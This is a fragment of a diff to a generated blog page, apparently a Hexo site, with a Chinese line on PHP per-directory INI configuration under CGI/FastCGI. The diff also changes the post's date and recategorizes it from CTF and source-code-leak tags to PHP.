+自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
-                                </a>
-                            
-                            <a href="/categories/CTF/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" class="post-category" target="_blank">
-                                    源码泄露
+                            <a href="/categories/PHP/" class="post-category" target="_blank">
+                                    PHP
                                 </a>
                             
                             
@@ -616,12 +730,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" target="_blank">
-                        <span class="chip bg-color">源码泄露</span>
+                    <a href="/tags/PHP/" target="_blank">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
